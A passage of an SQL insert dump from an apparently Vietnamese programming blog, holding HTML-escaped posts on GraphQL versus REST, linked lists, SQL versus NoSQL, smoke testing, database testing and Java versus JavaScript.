System:</strong>&nbsp;GraphQL c&oacute; hệ thống kiểu dữ liệu r&otilde; r&agrave;ng hơn so với REST, cho ph&eacute;p định nghĩa c&aacute;c kiểu dữ liệu đơn giản hoặc phức tạp. Điều n&agrave;y gi&uacute;p x&aacute;c định c&aacute;c y&ecirc;u cầu hợp lệ từ ph&iacute;a m&aacute;y kh&aacute;ch v&agrave; trả về dữ liệu đ&uacute;ng định dạng từ ph&iacute;a m&aacute;y chủ.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Schema:&nbsp;</strong>GraphQL sử dụng một tập tin Schema để m&ocirc; tả c&aacute;c trường v&agrave; kiểu dữ liệu c&oacute; thể truy vấn bởi m&aacute;y kh&aacute;ch. Schema cho ph&eacute;p nh&agrave; ph&aacute;t triển định nghĩa API của họ một c&aacute;ch r&otilde; r&agrave;ng, gi&uacute;p người d&ugrave;ng dễ d&agrave;ng hiểu c&aacute;ch thức hoạt động của API v&agrave; tạo ra c&aacute;c c&ocirc;ng cụ ph&aacute;t triển tự động.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Query Language:&nbsp;</strong>GraphQL sử dụng ng&ocirc;n ngữ truy vấn (Query Language) để y&ecirc;u cầu dữ liệu từ m&aacute;y chủ. Ng&ocirc;n ngữ truy vấn n&agrave;y cho ph&eacute;p m&aacute;y kh&aacute;ch y&ecirc;u cầu c&aacute;c trường v&agrave; dữ liệu cụ thể m&agrave; n&oacute; cần, gi&uacute;p tr&aacute;nh t&igrave;nh trạng dư thừa dữ liệu v&agrave; tăng hiệu suất ứng dụng.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Resolver:&nbsp;</strong>Resolver l&agrave; một phần của m&aacute;y chủ GraphQL, n&oacute; sẽ truy vấn cơ sở dữ liệu hoặc c&aacute;c dịch vụ kh&aacute;c để lấy dữ liệu y&ecirc;u cầu từ m&aacute;y kh&aacute;ch. Resolver cũng c&oacute; nhiệm vụ kiểm tra v&agrave; x&aacute;c thực c&aacute;c y&ecirc;u cầu truy vấn, gi&uacute;p đảm bảo t&iacute;nh to&agrave;n vẹn v&agrave; an to&agrave;n của hệ thống.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Tooling:</strong>&nbsp;GraphQL được hỗ trợ bởi c&aacute;c c&ocirc;ng cụ v&agrave; thư viện tốt hơn so với REST, gi&uacute;p dễ d&agrave;ng tạo ra c&aacute;c t&agrave;i liệu API tự động, kiểm tra lỗi, v&agrave; đơn giản h&oacute;a việc ph&aacute;t triển v&agrave; bảo tr&igrave; ứng dụng.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>3. ƯU V&Agrave; NHƯỢC ĐIỂM CỦA GRAPHQL</p>\r\n\r\n<blockquote>Việc sử dụng GraphQL trong c&aacute;c doanh nghiệp c&oacute; lẽ c&ograve;n chưa qu&aacute; phổ biến. Tuy nhi&ecirc;n trong tương lai, đ&acirc;y sẽ l&agrave; lựa chọn của nhiều nh&agrave; ph&aacute;t triển. Bạn c&oacute; thể c&acirc;n nhắc từ những ưu &ndash; nhược điểm của n&oacute; để sử dụng.</blockquote>\r\n\r\n<p>Ưu điểm của GraphQL:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Giảm thiểu lượng dữ liệu truyền qua mạng:&nbsp;</strong>GraphQL cho ph&eacute;p client chỉ định ch&iacute;nh x&aacute;c dữ liệu cần lấy, từ đ&oacute; giảm bớt lượng dữ liệu kh&ocirc;ng cần thiết truyền qua mạng, cải thiện hiệu suất v&agrave; tăng tốc độ phản hồi của ứng dụng.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>T&iacute;nh linh hoạt:</strong>&nbsp;GraphQL cho ph&eacute;p truy vấn dữ liệu từ nhiều nguồn kh&aacute;c nhau trong c&ugrave;ng một lời truy vấn. Điều n&agrave;y gi&uacute;p cho việc ph&aacute;t triển ứng dụng trở n&ecirc;n dễ d&agrave;ng v&agrave; linh hoạt hơn.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>T&iacute;nh tương th&iacute;ch:&nbsp;</strong>GraphQL l&agrave; một ng&ocirc;n ngữ truy vấn độc lập với bất kỳ nền tảng hay ng&ocirc;n ngữ lập tr&igrave;nh n&agrave;o. V&igrave; vậy, n&oacute; c&oacute; thể được sử dụng cho bất kỳ ứng dụng n&agrave;o, đồng thời hỗ trợ c&aacute;c c&ocirc;ng nghệ như React, Vue, Angular, NodeJS, Python, Java, Ruby,...</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Định dạng dữ liệu trả về linh hoạt:</strong>&nbsp;GraphQL cho ph&eacute;p client chỉ định định dạng dữ liệu trả về. Điều n&agrave;y gi&uacute;p cho việc hiển thị dữ liệu trở n&ecirc;n linh hoạt hơn, giảm bớt sự phụ thuộc v&agrave;o cấu tr&uacute;c của backend.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>Nhược điểm của GraphQL:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Kh&oacute; khăn cho những người mới bắt đầu:&nbsp;</strong>V&igrave; GraphQL c&oacute; cấu tr&uacute;c kh&aacute;c với RESTful API, n&ecirc;n việc t&igrave;m hiểu v&agrave; triển khai GraphQL c&oacute; thể đ&ograve;i hỏi thời gian v&agrave; nỗ lực hơn so với RESTful API.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Thiếu t&iacute;nh tương th&iacute;ch với c&aacute;c c&ocirc;ng nghệ cũ:&nbsp;</strong>GraphQL kh&ocirc;ng ho&agrave;n to&agrave;n tương th&iacute;ch với c&aacute;c c&ocirc;ng nghệ cũ, đặc biệt l&agrave; c&aacute;c hệ thống lớn, c&oacute; cấu tr&uacute;c phức tạp.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>C&oacute; thể g&acirc;y ra vấn đề về bảo mật:&nbsp;</strong>V&igrave; GraphQL cho ph&eacute;p client lấy dữ liệu theo y&ecirc;u cầu, n&ecirc;n c&oacute; thể g&acirc;y ra c&aacute;c vấn đề li&ecirc;n quan đến bảo mật như tấn c&ocirc;ng query hoặc sử dụng t&agrave;i nguy&ecirc;n qu&aacute; nhiều.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>4. NHỮNG ƯU ĐIỂM VƯỢT TRỘI CỦA GRAPHQL SO VỚI REST API TRUYỀN THỐNG</p>\r\n\r\n<blockquote>GraphQL v&agrave; REST đều l&agrave; c&aacute;c kiểu kiến tr&uacute;c API, nhưng c&aacute;ch thức ch&uacute;ng hoạt động kh&aacute;c nhau. GraphQL được thiết kế để giải quyết một số vấn đề m&agrave; REST gặp phải.</blockquote>\r\n\r\n<p>Dưới đ&acirc;y l&agrave; một số l&yacute; do tại sao n&ecirc;n sử dụng GraphQL thay cho REST:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>Efficiency: GraphQL cho ph&eacute;p lấy dữ liệu chỉ cần một y&ecirc;u cầu duy nhất, trong khi REST thường y&ecirc;u cầu nhiều y&ecirc;u cầu ri&ecirc;ng biệt để lấy dữ liệu từ nhiều endpoint kh&aacute;c nhau. Điều n&agrave;y gi&uacute;p giảm tải cho m&aacute;y chủ v&agrave; tăng hiệu suất ứng dụng.</p>\r\n	</li>\r\n	<li>\r\n	<p>Flexibility: GraphQL cho ph&eacute;p người d&ugrave;ng lựa chọn c&aacute;c trường dữ liệu m&agrave; họ muốn lấy, trong khi REST trả về tất cả c&aacute;c trường dữ liệu c&oacute; sẵn tr&ecirc;n endpoint. Điều n&agrave;y gi&uacute;p tr&aacute;nh t&igrave;nh trạng dư thừa dữ liệu v&agrave; giảm lượng dữ liệu được truyền giữa m&aacute;y kh&aacute;ch v&agrave; m&aacute;y chủ.</p>\r\n	</li>\r\n	<li>\r\n	<p>Type System: GraphQL c&oacute; hệ thống kiểu dữ liệu r&otilde; r&agrave;ng hơn REST, cho ph&eacute;p định nghĩa c&aacute;c kiểu dữ liệu đơn giản hoặc phức tạp, gi&uacute;p x&aacute;c định c&aacute;c y&ecirc;u cầu hợp lệ từ ph&iacute;a m&aacute;y kh&aacute;ch v&agrave; trả về dữ liệu đ&uacute;ng định dạng từ ph&iacute;a m&aacute;y chủ.</p>\r\n	</li>\r\n	<li>\r\n	<p>Tooling: GraphQL được hỗ trợ bởi c&aacute;c c&ocirc;ng cụ v&agrave; thư viện tốt hơn so với REST, gi&uacute;p dễ d&agrave;ng tạo ra c&aacute;c t&agrave;i liệu API tự động, kiểm tra lỗi, v&agrave; đơn giản h&oacute;a việc ph&aacute;t triển v&agrave; bảo tr&igrave; ứng dụng.</p>\r\n	</li>\r\n	<li>\r\n	<p>Versioning: REST y&ecirc;u cầu việc quản l&yacute; c&aacute;c phi&ecirc;n bản API để hỗ trợ việc thay đổi định dạng hoặc dữ liệu. Với GraphQL, nh&agrave; ph&aacute;t triển c&oacute; thể th&ecirc;m hoặc x&oacute;a c&aacute;c trường dữ liệu mới m&agrave; kh&ocirc;ng cần phải tạo ra phi&ecirc;n bản mới của API.</p>\r\n	</li>\r\n</ul>', 'photo/372828739_1447226599177316_3727958516890501084_n.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(89, 'LINKED LIST VÀ TOP 5 THAO TÁC CƠ BẢN.', 'dev ơi mình đi đâu thế?', '<p>Linked list l&agrave; một cấu tr&uacute;c dữ liệu trong ng&ocirc;n ngữ lập tr&igrave;nh C++. N&oacute; được sử dụng để lưu trữ một danh s&aacute;ch c&aacute;c phần tử li&ecirc;n kết với nhau.</p>\r\n\r\n<p>Trong C++, để tạo một linked list, ch&uacute;ng ta cần c&oacute; hai phần tử quan trọng l&agrave; một n&uacute;t (node) v&agrave; một con trỏ (pointer).</p>\r\n\r\n<p>* TOP 5 THAO T&Aacute;C CƠ BẢN VỚI LINKED LIST.</p>\r\n\r\n<p><strong>1.&nbsp;<em>Traversing linked list</em></strong>: Đ&acirc;y l&agrave; việc duyệt qua từng node của linked list v&agrave; thực hiện một h&agrave;nh động cụ thể, v&iacute; dụ như in gi&aacute; trị node ra m&agrave;n h&igrave;nh hoặc t&iacute;nh tổng c&aacute;c gi&aacute; trị trong linked list.</p>\r\n\r\n<p><strong>2.&nbsp;<em>Th&ecirc;m, x&oacute;a node:</em></strong>&nbsp;Trong dạng b&agrave;i n&agrave;y, bạn sẽ được y&ecirc;u cầu thực hiện c&aacute;c thao t&aacute;c th&ecirc;m hoặc x&oacute;a c&aacute;c node ở c&aacute;c vị tr&iacute; cụ thể trong linked list. V&iacute; dụ như th&ecirc;m một node v&agrave;o đầu linked list, x&oacute;a node ở cuối linked list, hoặc ch&egrave;n node v&agrave;o giữa linked list.</p>\r\n\r\n<p><strong>3.&nbsp;<em>Reverse linked list:</em></strong>&nbsp;B&agrave;i to&aacute;n n&agrave;y y&ecirc;u cầu bạn đảo ngược thứ tự c&aacute;c node trong linked list. Bạn c&oacute; thể sử dụng c&aacute;c kỹ thuật như sử dụng 3 con trỏ hoặc sử dụng đệ quy để giải quyết b&agrave;i to&aacute;n n&agrave;y.</p>\r\n\r\n<p><strong>4.&nbsp;<em>T&igrave;m kiếm v&agrave; x&oacute;a node:</em></strong>&nbsp;Trong dạng b&agrave;i n&agrave;y, bạn sẽ được y&ecirc;u cầu t&igrave;m kiếm một gi&aacute; trị cụ thể trong linked list. Nếu t&igrave;m thấy gi&aacute; trị n&agrave;y, bạn phải x&oacute;a node chứa gi&aacute; trị đ&oacute; khỏi linked list.</p>\r\n\r\n<p><strong>5.&nbsp;<em>Merge hai linked list:&nbsp;</em></strong>Đ&acirc;y l&agrave; b&agrave;i to&aacute;n y&ecirc;u cầu bạn kết hợp hai linked list đ&atilde; cho th&agrave;nh một linked list mới theo một thứ tự cụ thể. Bạn c&oacute; thể sử dụng c&aacute;c kỹ thuật như sử dụng con trỏ để duyệt qua cả hai linked list v&agrave; tạo một linked list mới để kết hợp ch&uacute;ng.</p>\r\n\r\n<p>C&ugrave;ng m&igrave;nh t&igrave;m hiểu qua c&aacute;c đoạn code để hiểu th&ecirc;m nh&eacute;</p>\r\n\r\n<p>Hy vọng rằng th&ocirc;ng tin n&agrave;y c&oacute; thể gi&uacute;p bạn hiểu v&agrave; giải quyết c&aacute;c dạng b&agrave;i li&ecirc;n quan đến linked list trong qu&aacute; tr&igrave;nh học v&agrave; luyện tập.</p>\r\n\r\n<div class=\"ddict_btn\" style=\"top: 35px; left: 227.8px;\"><img src=\"chrome-extension://bpggmmljdiliancllaapiggllnkbjocb/logo/48.png\" /></div>', 'photo/371928963_1447226562510653_1458618629040059383_n.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(90, 'SQL hay NoSQL: Đâu là lựa chọn phù hợp cho dự án của bạn?', 'dev ơi mình đi đâu thế?', '<blockquote>Khi bắt đầu x&acirc;y dựng một ứng dụng, một dự &aacute;n, cơ sở dữ liệu l&agrave; một yếu tố quan trọng m&agrave; ta cần c&acirc;n nhắc lựa chọn. C&oacute; nhiều loại cơ sở dữ liệu, trong đ&oacute; hai dạng cơ bản l&agrave; SQL v&agrave; NoSQL. B&agrave;i viết n&agrave;y sẽ so s&aacute;nh hai kiểu cơ sở dữ liệu tr&ecirc;n gi&uacute;p bạn c&oacute; thể xem x&eacute;t chọn cơ sở dữ liệu th&iacute;ch hợp cho m&igrave;nh.</blockquote>\r\n\r\n<p><strong>SQL (RELATIONAL DATABASE)</strong></p>\r\n\r\n<p>SQL sử dụng m&ocirc; h&igrave;nh quan hệ, chứa c&aacute;c dữ liệu li&ecirc;n quan với nhau trong bảng. SQL cần c&oacute; một schema để định nghĩa c&aacute;c bảng trước khi sử dụng. SQL c&oacute; thể truy vấn c&aacute;c dữ liệu c&oacute; mối quan hệ phức tạp, song sẽ l&agrave;m giảm hiệu suất. Tuy nhi&ecirc;n, việc mở rộng thường sẽ tốn nhiều c&ocirc;ng sức v&agrave; chi ph&iacute;.</p>\r\n\r\n<p><strong>Ưu điểm</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>C&oacute; thể truy vấn dữ liệu c&oacute; mối quan hệ phức tạp</p>\r\n	</li>\r\n	<li>\r\n	<p>Đảm bảo t&iacute;nh to&agrave;n vẹn (ACID) cho dữ liệu</p>\r\n	</li>\r\n	<li>\r\n	<p>Hệ thống quản l&iacute; mạnh mẽ</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>Nhược điểm</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>Tốc độ truy vấn dữ liệu phi cấu tr&uacute;c hay dữ liệu c&oacute; độ phức tạp cao kh&aacute; chậm</p>\r\n	</li>\r\n	<li>\r\n	<p>Khả năng mở rộng kh&oacute; khăn, tốn k&eacute;m</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><em>C&aacute;c dự &aacute;n th&iacute;ch hợp: quản l&iacute; kho h&agrave;ng, ứng dụng web thương mại điện tử cần quản l&yacute; dữ liệu sản phẩm, đơn h&agrave;ng, kh&aacute;ch h&agrave;ng,&hellip;</em></p>\r\n\r\n<p><strong>NOSQL</strong></p>\r\n\r\n<p>NoSQL kh&ocirc;ng sử dụng m&ocirc; h&igrave;nh quan hệ, c&oacute; thể chứa dữ liệu m&agrave; kh&ocirc;ng cần một schema cụ thể. NoSQL c&oacute; hiệu suất cao khi dữ liệu c&oacute; độ phức tạp của quan hệ thấp. Ngo&agrave;i ra, NoSQL c&ograve;n cung cấp khả năng mở rộng dễ d&agrave;ng.</p>\r\n\r\n<p><strong>Ưu điểm</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>C&oacute; thể thay đổi cấu tr&uacute;c dữ liệu linh hoạt</p>\r\n	</li>\r\n	<li>\r\n	<p>Khả năng mở rộng cao, dễ d&agrave;ng</p>\r\n	</li>\r\n	<li>\r\n	<p>Tốc độ truy vấn nhanh với c&aacute;c dữ liệu c&oacute; quan hệ phức tạp thấp</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>Nhược điểm</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>&Iacute;t đảm bảo t&iacute;nh nhất qu&aacute;n của dữ liệu</p>\r\n	</li>\r\n	<li>\r\n	<p>Thiếu khả năng truy vấn dữ liệu phức tạp</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><em>C&aacute;c dự &aacute;n th&iacute;ch hợp: dự &aacute;n y&ecirc;u cầu update li&ecirc;n tục v&agrave; thời gian thực, c&aacute;c ứng dụng mạng x&atilde; hội,&hellip;</em></p>\r\n\r\n<p>Nh&igrave;n chung, SQL v&agrave; NoSQL đều l&agrave; những c&ocirc;ng cụ lưu trữ v&agrave; quản l&iacute; dữ liệu hiệu quả. Việc chọn SQL hay NoSQL t&ugrave;y thuộc v&agrave;o những y&ecirc;u cầu cụ thể của dự &aacute;n. Ch&uacute;ng ta cần c&acirc;n nhắc c&aacute;c yếu tố như quan hệ giữa dữ liệu, tốc độ, độ phức tạp dữ liệu, khả năng mở rộng,&hellip; để đưa ra quyết định th&iacute;ch hợp.</p>', 'photo/img-3.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(91, 'Smoking test ~ Đảm bảo hệ thống vận hành đúng từ những giai đoạn đầu', 'dev ơi mình đi đâu thế?', '<p><strong>Smoking test l&agrave; g&igrave;?</strong></p>\r\n\r\n<p>Smoking test l&agrave; một loại h&igrave;nh kiểm thử phần mềm được thực hiện sau khi c&oacute; bản build mới, nhằm đảm bảo rằng c&aacute;c chức năng ch&iacute;nh, quan trọng nhất của phần mềm vẫn hoạt động b&igrave;nh thường. N&oacute; được thực hiện &quot;trước&quot; bất kỳ kiểm tra chức năng hoặc hồi quy chi tiết n&agrave;o kh&aacute;c được thực hiện tr&ecirc;n bản dựng phần mềm.</p>\r\n\r\n<p><strong>Khi n&agrave;o th&igrave; thực hiện Smoke Testing?</strong></p>\r\n\r\n<p>Smoke Testing được thực hiện bất cứ khi n&agrave;o c&aacute;c chức năng mới của phần mềm được ph&aacute;t triển v&agrave; đưa v&agrave;o phi&ecirc;n bản c&oacute; trong m&ocirc;i trường QA/staging. N&oacute; đảm bảo rằng tất cả c&aacute;c chức năng quan trọng của sản phẩm đang hoạt động ch&iacute;nh x&aacute;c. Sau đ&oacute; mới tiến h&agrave;nh bước kiểm tra chức năng.</p>\r\n\r\n<p>Bất kỳ lỗi n&agrave;o được t&igrave;m ra trong bước Smoke Testing đều cần đưa lại cho đội ph&aacute;t triển để xử l&yacute;. Bất cứ khi n&agrave;o c&oacute; thay đổi trong bản build, ch&uacute;ng ta đều cần thực hiện Smoke Testing để đảm bảo t&iacute;nh ổn định cho sản phẩm.</p>\r\n\r\n<p><strong>Vai tr&ograve; của smoking test</strong></p>\r\n\r\n<p>Smoke Testing c&oacute; thể gi&uacute;p tối ưu hiệu quả trong việc kiểm thử phần mềm bằng c&aacute;ch:</p>\r\n\r\n<p><em>Smoke Testing gi&uacute;p tiết kiệm thời gian v&agrave; nguồn lực</em>&nbsp;khi chỉ kiểm tra c&aacute;c t&iacute;nh năng cơ bản v&agrave; quan trọng nhất của phần mềm, gi&uacute;p ti&ecirc;u thụ &iacute;t thời gian v&agrave; nguồn lực hơn so với kiểm thử to&agrave;n diện</p>\r\n\r\n<p><em>Ph&aacute;t hiện sớm c&aacute;c lỗi v&agrave; vấn đề của phần mềm</em>: Trong v&ograve;ng đời đầu ti&ecirc;n của sản phẩm từ những lỗi cơ bản hay nghi&ecirc;m trọng cũng sẽ được t&igrave;m ra nếu qu&aacute; tr&igrave;nh Smoke Testing diễn ra th&agrave;nh c&ocirc;ng. Tất cả vấn đề sẽ được khắc phục trong bản Build đầu ti&ecirc;n gi&uacute;p đảm bảo chất lượng v&agrave; t&iacute;nh ổn định của dự &aacute;n.</p>\r\n\r\n<p><em>Với những bản sản phẩm ph&aacute;t h&agrave;nh đ&atilde; được sửa, Smoke Testing x&aacute;c minh n&oacute; kh&ocirc;ng ảnh hưởng đến c&aacute;c chức năng ch&iacute;nh của hệ thống</em>. Smoke Testing c&oacute; thể chỉ cần v&agrave;i ph&uacute;t để thực hiện qu&aacute; tr&igrave;nh của m&igrave;nh v&agrave; đặc biệt sẽ chạy rất nhanh nếu được tự động h&oacute;a (Automation) v&igrave; thế bạn sẽ kh&ocirc;ng cần đợi l&acirc;u để nhận được phản hồi.</p>\r\n\r\n<blockquote><em>Nguy cơ n&agrave;o sẽ xảy ra khi ch&uacute;ng ta bỏ qua Smoke Testing?</em></blockquote>\r\n\r\n<blockquote>Nếu ch&uacute;ng ta kh&ocirc;ng thực hiện Smoke Testing trong giai đoạn đầu, c&aacute;c defect c&oacute; thể sẽ xuất hiện trong c&aacute;c giai đoạn sau, khi việc xử l&yacute; c&oacute; thể tốn k&eacute;m chi ph&iacute; v&agrave; thời gian hơn. C&aacute;c defect xuất hiện trong c&aacute;c giai đoạn sau c&ograve;n c&oacute; thể l&agrave; vật cản ảnh hưởng đến việc release c&aacute;c sản phẩm cuối.</blockquote>\r\n\r\n<p><strong>Quy tr&igrave;nh thực hiện Smoke Testing</strong></p>\r\n\r\n<p>Smoke Testing c&oacute; thể được thể hiện qua c&aacute;c bước sau:</p>\r\n\r\n<p>1. X&aacute;c định mục ti&ecirc;u của việc kiểm thử, bao gồm c&aacute;c t&iacute;nh năng cần kiểm thử v&agrave; y&ecirc;u cầu chất lượng tương ứng</p>\r\n\r\n<p>2. Lập kế hoạch kiểm thử v&agrave; chọn c&ocirc;ng cụ kiểm thử tương ứng với mục ti&ecirc;u v&agrave; y&ecirc;u cầu</p>\r\n\r\n<p>3. Thực hiện kiểm thử theo kế hoạch, bao gồm c&aacute;c bước như tải phần mềm, thực hiện c&aacute;c t&iacute;nh năng cần kiểm thử v&agrave; ghi lại kết quả</p>\r\n\r\n<p>4. Đ&aacute;nh gi&aacute; kết quả kiểm thử để x&aacute;c định xem c&aacute;c t&iacute;nh năng c&oacute; hoạt động đ&uacute;ng kh&ocirc;ng. Nếu c&oacute; lỗi v&agrave; vấn đề ph&aacute;t sinh, ghi lại v&agrave; sửa chữa</p>\r\n\r\n<p>5. Kết luận về hiệu quả của việc kiểm thử v&agrave; x&aacute;c định c&aacute;c bước tiếp theo để ho&agrave;n thiện phần mềm</p>', 'photo/img-1.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(92, 'Database testing – Kiểm thử cơ sở dữ liệu', 'dev ơi mình đi đâu thế?', '<p><strong>DATABASE TESTING L&Agrave; G&Igrave;?</strong></p>\r\n\r\n<p>Database testing l&agrave; qu&aacute; tr&igrave;nh kiểm tra to&agrave;n diện đảm bảo t&iacute;nh to&agrave;n vẹn (data mapping), nhất qu&aacute;n (data integrity) cũng như c&aacute;c thuộc t&iacute;nh ACID của cơ sở dữ liệu. N&oacute; c&oacute; thể li&ecirc;n quan đến việc tạo c&aacute;c truy vấn phức tạp để load/stress test dữ liệu v&agrave; kiểm tra phản ứng của n&oacute;.</p>\r\n\r\n<p><strong>PH&Acirc;N LOẠI DATABASE TESTING</strong></p>\r\n\r\n<p><strong>Structural Testing &ndash; Kiểm thử cấu tr&uacute;c:&nbsp;</strong>Kiểm tra t&iacute;nh hợp lệ của c&aacute;c yếu tố cấu tr&uacute;c cơ sở dữ liệu như bảng, cột, r&agrave;ng buộc, v.v., chủ yếu được thực hiện ở cấp độ unit test. Trong giai đoạn n&agrave;y tester cần c&oacute; kiến thức về việc thực hiện nội bộ của m&atilde; . C&aacute;c truy vấn SQL ch&iacute;nh l&agrave; ch&igrave;a kh&oacute;a cho sự th&agrave;nh c&ocirc;ng của giai đoạn n&agrave;y.</p>\r\n\r\n<p><strong>Functional Testing &ndash; Kiểm thử chức năng:&nbsp;</strong>Kiểm tra chức năng của cơ sở dữ liệu đảm bảo c&aacute;c giao dịch v&agrave; hoạt động thực hiện bởi người d&ugrave;ng l&agrave; ph&ugrave; hợp với y&ecirc;u cầu kỹ thuật.</p>\r\n\r\n<p><strong>Non-functional Testing &ndash; Kiểm thử phi chức năng:&nbsp;</strong>Được chia l&agrave;m nhiều loại t&ugrave;y theo y&ecirc;u cầu đặc tả. C&oacute; thể kể đến như:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Load testing &ndash; Kiểm thử tải:</strong>X&aacute;c nhận c&aacute;c đặc t&iacute;nh hoạt động của hệ thống hoặc ứng dụng đang được kiểm tra khi phải chịu tải c&ocirc;ng việc v&agrave; tải trọng dự kiến trong qu&aacute; tr&igrave;nh sản xuất.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Stress testing &ndash; Kiểm thử qu&aacute; tải:</strong>&nbsp;Tập trung v&agrave;o việc x&aacute;c nhận c&aacute;c đặc t&iacute;nh hoạt động của hệ thống hoặc ứng dụng đang được kiểm tra khi chịu c&aacute;c điều kiện căng thẳng như hạn chế về bộ nhớ, qu&aacute; tải người d&ugrave;ng,&hellip;</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Performance testing &ndash; Kiểm thử hiệu suất:</strong>&nbsp;Kiểm tra tốc độ, t&iacute;nh ổn định của hệ thống, ứng dụng đang kiểm thử. Mục ti&ecirc;u ch&iacute;nh của việc kiểm thử n&agrave;y nhằm x&aacute;c định xem cơ sở dữ liệu c&oacute; thể đ&aacute;p ứng được nhu cầu truy cập của người d&ugrave;ng một c&aacute;ch hiệu quả hay kh&ocirc;ng.</p>\r\n	</li>\r\n</ul>', 'photo/img-2.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(93, 'Java và Javascript: tưởng “anh em một nhà” nhưng lại là “người dưng nước lã”', 'dev ơi mình đi đâu thế?', '<p>C&oacute; một c&acirc;u n&oacute;i nổi tiếng rằng, Java đối với JavaScript cũng giống như từ &lsquo;&rsquo;ham&rsquo;&rsquo; trong &ldquo;hamster&rdquo;. Điều n&agrave;y cho cậu một số &yacute; tưởng Java v&agrave; JavaScript kh&aacute;c nhau thế n&agrave;o, mặc d&ugrave; t&ecirc;n của ch&uacute;ng na n&aacute; nhau. Ch&uacute;ng m&igrave;nh h&atilde;y c&ugrave;ng t&igrave;m hiểu về Java v&agrave; JavaScript để gi&uacute;p cậu hiểu ng&ocirc;n ngữ n&agrave;o l&agrave; lựa chọn tốt hơn cho sự khởi đầu trong h&agrave;nh tr&igrave;nh lập tr&igrave;nh của cậu nhaaa. Let&rsquo;s go!</p>\r\n\r\n<p>----------------------------------------------------------</p>\r\n\r\n<p><strong>1.</strong>&nbsp;<strong>JAVA C&Oacute; PHẢI L&Agrave; TỪ VIẾT TẮT CỦA JAVASCRIPT HAY KH&Ocirc;NG?</strong></p>\r\n\r\n<p>Sự tương đồng về t&ecirc;n gọi n&agrave;y l&agrave;&nbsp;<em>c&oacute; chủ &yacute;</em>. Java, được tạo ra v&agrave;o năm 1990 bởi James A. Gosling. Mục đ&iacute;ch của ng&ocirc;n ngữ lập tr&igrave;nh n&agrave;y l&agrave; để thế chỗ cho C++ nhưng vẫn giữ nguy&ecirc;n c&aacute;c t&iacute;nh năng tương tự Objective C. Java hứa hẹn nguy&ecirc;n tắc&nbsp;<strong>WORA</strong>&nbsp;(Write once, Run everywhere -&gt; Chỉ cần viết một lần, chạy được ở mọi nơi).</p>\r\n\r\n<p>JavaScript l&agrave; một ng&ocirc;n ngữ lập tr&igrave;nh được ph&aacute;t triển bởi h&atilde;ng truyền th&ocirc;ng Netscape v&agrave;o năm 1995. Ban đầu c&oacute; t&ecirc;n gọi l&agrave; LiveScript, nhưng trong một &ldquo;<em>m&aacute;nh kh&oacute;e</em>&rdquo; marketing giữa Netscape v&agrave; Sun, c&aacute;i t&ecirc;n LiveScript đ&atilde; được đổi th&agrave;nh JavaScript với mong muốn JavaScript sẽ được hưởng l&acirc;y &ldquo;<em>tiếng thơm</em>&rdquo; của Java, vốn đ&atilde; rất được ưa chuộng trước đ&oacute;. Nhưng điều kỳ lạ l&agrave; sau đ&oacute;, JavaScript lại được biết đến nhiều hơn cả so với &ldquo;<em>tiền bối</em>&rdquo; Java.</p>\r\n\r\n<p>Nhiều &yacute; kiến cho rằng JavaScript c&oacute; được ng&agrave;y h&ocirc;m nay l&agrave; nhờ v&agrave;o sự nổi tiếng của Java. Nhưng kh&ocirc;ng phải ai cũng đồng t&igrave;nh với quan điểm n&agrave;y. Ngo&agrave;i quy ước đặt t&ecirc;n tương tự nhau th&igrave; 2 ng&ocirc;n ngữ n&agrave;y kh&ocirc;ng c&oacute; nhiều điểm chung.</p>\r\n\r\n<p>-----------------------------------------------------------------</p>\r\n\r\n<p><strong>2.</strong>&nbsp;<strong>JAVA V&Agrave; JAVASCRIPT C&Oacute; G&Igrave; GIỐNG V&Agrave; KH&Aacute;C NHAU?</strong></p>\r\n\r\n<p>Mặc d&ugrave; đều l&agrave; 2 ng&ocirc;n ngữ lập tr&igrave;nh hướng đối tượng bậc cao, sử dụng c&uacute; ph&aacute;p C v&agrave; c&oacute; c&aacute;i t&ecirc;n na n&aacute; nhau, nhưng sự thực l&agrave; Java v&agrave; JavaSript kh&aacute;c nhau rất nhiều.</p>\r\n\r\n<p><strong>JAVA</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>L&agrave; ng&ocirc;n ngữ được bi&ecirc;n dịch, tức l&agrave; khi m&atilde; code được viết trong m&ocirc;i trường ph&aacute;t triển t&iacute;ch hợp th&igrave; n&oacute; sẽ tự động được bi&ecirc;n dịch th&agrave;nh m&atilde; bytecode v&agrave; chạy bằng m&aacute;y ảo Java.</p>\r\n	</li>\r\n	<li>\r\n	<p>C&oacute; khả năng t&aacute;i sử dụng code tr&ecirc;n to&agrave;n bộ dự &aacute;n.</p>\r\n	</li>\r\n	<li>\r\n	<p>Sử dụng h&igrave;nh thức x&aacute;c minh dữ liệu tĩnh. Trong qu&aacute; tr&igrave;nh bi&ecirc;n dịch, dữ liệu sẽ được kiểm tra v&agrave; lập 